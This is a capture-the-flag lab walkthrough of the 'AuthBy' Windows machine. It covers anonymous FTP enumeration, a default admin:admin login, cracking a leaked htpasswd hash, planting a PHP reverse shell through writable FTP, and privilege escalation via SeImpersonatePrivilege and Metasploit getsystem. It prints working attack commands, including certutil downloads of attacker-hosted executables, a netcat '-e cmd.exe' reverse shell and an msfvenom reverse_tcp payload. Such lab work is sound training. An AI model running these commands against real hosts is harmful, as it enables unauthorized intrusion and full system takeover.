---
machine: AuthBy
platform: Proving Grounds
category: Windows
difficulty: Hard
tags: [anonymous-ftp, http-basic-auth, hash-cracking, ftp-write-access, webshell, seimpersonate, potato-attack, metasploit]
date: 2026-08-25
status: retired
summary: A Windows box fronting an old FTP server and a Basic-Auth-restricted web app — testing anonymous FTP enumeration to leak account artifacts, offline cracking of a leaked htpasswd hash to pass Basic Auth, abuse of writable FTP storage to plant a web-reachable PHP shell, and a SeImpersonatePrivilege token-impersonation technique for the path to SYSTEM.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/authby/nmapscan]
└─$ nmap-full 192.168.245.46
[*] Running fast port discovery on 192.168.245.46...
[sudo] password for kali: 
[*] Open ports: 21,242,3145,3389
[*] Running full scan on 192.168.245.46...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-25 10:57 -0400
Nmap scan report for 192.168.245.46
Host is up (0.036s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           zFTPServer 6.0 build 2011-10-17
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| total 9680
| ----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
| ----------   1 root     root           25 Feb 10  2011 UninstallService.bat
| ----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
| ----------   1 root     root           17 Aug 13  2011 StopService.bat
| ----------   1 root     root           18 Aug 13  2011 StartService.bat
| ----------   1 root     root         8736 Nov 09  2011 Settings.ini
| dr-xr-xr-x   1 root     root          512 Aug 25 21:57 log
| ----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
| ----------   1 root     root           23 Feb 10  2011 InstallService.bat
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
| dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
|_dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts
242/tcp  open  http          Apache httpd 2.2.21 ((Win32) PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (Win32) PHP/5.3.8
| http-auth: 
| HTTP/1.1 401 Authorization Required\x0D
|_  Basic realm=Qui e nuce nuculeum esse volt, frangit nucem!
|_http-title: 401 Authorization Required
3145/tcp open  zftp-admin    zFTPServer admin
3389/tcp open  ms-wbt-server Microsoft Terminal Service
| ssl-cert: Subject: commonName=LIVDA
| Not valid before: 2024-08-01T10:50:21
|_Not valid after:  2025-01-31T10:50:21
| rdp-ntlm-info: 
|   Target_Name: LIVDA
|   NetBIOS_Domain_Name: LIVDA
|   NetBIOS_Computer_Name: LIVDA
|   DNS_Domain_Name: LIVDA
|   DNS_Computer_Name: LIVDA
|   Product_Version: 6.0.6001
|_  System_Time: 2026-08-25T14:57:41+00:00
|_ssl-date: 2026-08-25T14:57:46+00:00; +1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.33 seconds
```

Our webapp on port 242 gives us a realm-restricted browser login portal:

![Browser Basic Auth prompt for the realm "Qui e nuce nuculeum esse volt, frangit nucem!"](/media/Pasted%20image%2020260825100134.png)

We have a zFTPServer admin on 3145 and an anonymous ftp login on 21 we can pull down.

We can conduct a searchsploit search:

```bash
┌──(kali㉿kali)-[~/oscp/authby]
└─$ searchsploit zftp  
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
zFTP Client 20061220 - 'Connection Name' Local Buffer Overflow                                                        | linux/local/40203.py
zFTPServer - 'cwd/stat' Remote Denial of Service                                                                      | windows/dos/18028.py
zFTPServer Suite 6.0.0.52 - 'rmdir' Directory Traversal                                                               | windows/remote/18235.pl
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We pull down the FTP share:

```bash
┌──(kali㉿kali)-[~/oscp/authby/nmapscan]
└─$ wget -r --no-passive ftp://anonymous:anonymous@target/
```

We can't pull down any actual files, as only very few are readable:

```bash
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ ftp 192.168.245.46 21
Connected to 192.168.245.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.245.46:kali): anonymous
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2049|)
150 Opening connection for /bin/ls.
total 9680
----------   1 root     root      5610496 Oct 18  2011 zFTPServer.exe
----------   1 root     root           25 Feb 10  2011 UninstallService.bat
----------   1 root     root      4284928 Oct 18  2011 Uninstall.exe
----------   1 root     root           17 Aug 13  2011 StopService.bat
----------   1 root     root           18 Aug 13  2011 StartService.bat
----------   1 root     root         8736 Nov 09  2011 Settings.ini
dr-xr-xr-x   1 root     root          512 Aug 25 21:57 log
----------   1 root     root         2275 Aug 08  2011 LICENSE.htm
----------   1 root     root           23 Feb 10  2011 InstallService.bat
dr-xr-xr-x   1 root     root          512 Nov 08  2011 extensions
dr-xr-xr-x   1 root     root          512 Nov 08  2011 certificates
dr-xr-xr-x   1 root     root          512 Aug 02  2024 accounts
226 Closing data connection.
ftp> cd accounts
250 CWD Command successful.
ftp> ls -lah
229 Entering Extended Passive Mode (|||2050|)
150 Opening connection for /bin/ls.
total 4
dr-xr-xr-x   1 root     root          512 Aug 02  2024 backup
----------   1 root     root          764 Aug 02  2024 acc[Offsec].uac
----------   1 root     root         1034 Aug 25 22:07 acc[anonymous].uac
----------   1 root     root          926 Aug 02  2024 acc[admin].uac
d--x--x--x   1 root     root          512 Aug 25 15:09 ..
d--x--x--x   1 root     root          512 Aug 25 15:09 .
```

We can infer from the title names in accounts that users Offsec, anonymous and admin exist.

## Foothold

We can attempt `admin:admin` on the ftp share:

```bash
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ ftp 192.168.245.46 21
Connected to 192.168.245.46.
220 zFTPServer v6.0, build 2011-10-17 15:25 ready.
Name (192.168.245.46:kali): admin
331 User name received, need password.
Password: 
230 User logged in, proceed.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||2058|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
```

We can `mget *` these files down and then read them:

```bash
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ cat .htaccess 
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>   

┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ cat .htaccess 
AuthName "Qui e nuce nuculeum esse volt, frangit nucem!"
AuthType Basic
AuthUserFile c:\\wamp\www\.htpasswd
<Limit GET POST PUT>
Require valid-user
</Limit>                                                                                                                                                        
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ cat index.php 
<center><pre>Qui e nuce nuculeum esse volt, frangit nucem!</pre></center>                                                                                                                                                        
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ cat .htpasswd
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
```

We can crack this hash (hashcat mode 1600) with hashcat and rockyou.txt wordlist:

```bash
hashcat hashme /home/fletcher/Downloads/cf/rockyou.txt

$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0:elite
```

We get cred pair offsec:elite, this gives us access to the webapp. We can base64 encode these creds and include them in an authorization header to feroxbust the site:

```bash
┌──(kali㉿kali)-[~/oscp/authby]
└─$ echo -n 'offsec:elite' | base64
b2Zmc2VjOmVsaXRl

┌──(kali㉿kali)-[~/oscp/authby]
└─$ feroxbuster -u http://target:242 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough -H "Authorization: Basic b2Zmc2VjOmVsaXRl"
```

```text
┌──(kali㉿kali)-[~/oscp/authby]
└─$ feroxbuster -u http://target:242 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --thorough -H "Authorization: Basic b2Zmc2VjOmVsaXRl" -C 404 

403      GET        8l       22w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        8w       76c http://target:242/
[####################] - 56s    62282/62282   0s      found:1       errors:0      
[####################] - 55s    62282/62282   1128/s  http://target:242/
```

We also attempt to ffuf vhost fuzz with the authorization header (after adding LIVDA to /etc/hosts):

```bash
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ ffuf -u http://LIVDA:242 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ" -H "Authorization: Basic b2Zmc2VjOmVsaXRl" -ac 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://LIVDA:242
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ
 :: Header           : Authorization: Basic b2Zmc2VjOmVsaXRl
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

We take a step back and see if we have write access to the ftp share with `admin:admin`. It seems we do.

```bash
ftp> put test
local: test remote: test
229 Entering Extended Passive Mode (|||2065|)
150 File status okay; about to open data connection.
     0        0.00 KiB/s 
226 Closing data connection.
ftp> ls
229 Entering Extended Passive Mode (|||2066|)
150 Opening connection for /bin/ls.
total 3
-r--r--r--   1 root     root            0 Aug 25 22:32 test
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.
```

This means, in theory, we should be able to make a PHP reverse shell, write it to the ftp directory, open a listener, and call our uploaded file via the authorized webapp:

```bash
┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ mousepad ivan.php

ftp> put ivan.php
local: ivan.php remote: ivan.php
229 Entering Extended Passive Mode (|||2067|)
150 File status okay; about to open data connection.
100% |***********************************************************************************************************|  9294       36.17 MiB/s    00:00 ETA
226 Closing data connection.
9294 bytes sent in 00:00 (112.15 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||2068|)
150 Opening connection for /bin/ls.
total 13
-r--r--r--   1 root     root            0 Aug 25 22:32 test
-r--r--r--   1 root     root         9294 Aug 25 22:35 ivan.php
-r--r--r--   1 root     root           76 Nov 08  2011 index.php
-r--r--r--   1 root     root           45 Nov 08  2011 .htpasswd
-r--r--r--   1 root     root          161 Nov 08  2011 .htaccess
226 Closing data connection.

┌──(kali㉿kali)-[~/…/authby/nmapscan/target/extensions]
└─$ rlwrap -cAr nc -lvnp 21   
listening on [any] 21 ...
connect to [192.168.45.226] from (UNKNOWN) [192.168.245.46] 49164
SOCKET: Shell has connected! PID: 3224
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\wamp\bin\apache\Apache2.2.21>whoami
livda\apache
```

We can retrieve the local.txt flag from `C:\Users\apache\Desktop`

## Privilege Escalation

We run `whoami /priv` and find that we have `SeImpersonatePrivilege` meaning we can easily obtain SYSTEM via transferring godpotato and netcat.

```bash
┌──(kali㉿kali)-[~/oscp/tools]
└─$ python3 -m http.server 80                                                                                                                       
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

C:\Users\apache\Documents>certutil -urlcache -split -f http://192.168.45.226/GodPotato-NET4.exe C:\Users\apache\Documents\gp.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\apache\Documents>certutil -urlcache -split -f http://192.168.45.226/nc.exe C:\Users\apache\Documents\nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\Users\apache\Documents>./gp.exe -cmd "cmd.exe /c C:\Users\apache\Documents\nc.exe 192.168.45.226 1337 -e cmd.exe"
```

This doesn't produce any output, however.

I try older NET versions and get the following error:

```bash
C:\Users\apache\Documents>gp3.exe -cmd "cmd.exe /c whoami"
[!] No combase module found
```

After trying several potatoes and printspoofer, I opt to employ metasploit's `getsystem` function.

I generate a msfvenom meterpreter payload for x86, set the appropriate lhost and lport options in metasploit, transfer and execute the payload to the target, then run `getsystem` on the established meterpreter shell.

```bash
┌──(kali㉿kali)-[~/oscp/authby]
└─$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.45.226 LPORT=80 -f exe -o reverse2.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 203452 bytes
Final size of exe file: 210432 bytes
Saved as: reverse2.exe

┌──(kali㉿kali)-[~/oscp/authby]
└─$ python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
192.168.245.46 - - [25/Aug/2026 15:05:07] "GET /reverse2.exe HTTP/1.1" 200 -
192.168.245.46 - - [25/Aug/2026 15:05:07] "GET /reverse2.exe HTTP/1.1" 200 -

msf exploit(multi/handler) > set lport 242
msf exploit(multi/handler) > set lport 80

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.45.226:80 
[*] Sending stage (203452 bytes) to 192.168.245.46
[*] Meterpreter session 1 opened (192.168.45.226:80 -> 192.168.245.46:49188) at 2026-08-25 15:05:19 -0400

meterpreter > getsystem
...got system via technique 6 (Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)).
meterpreter > shell
Process 3612 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Users\apache\Documents>whoami
whoami
nt authority\system
```

We have compromised the box now and can retrieve the proof.txt from the Administrator's desktop.
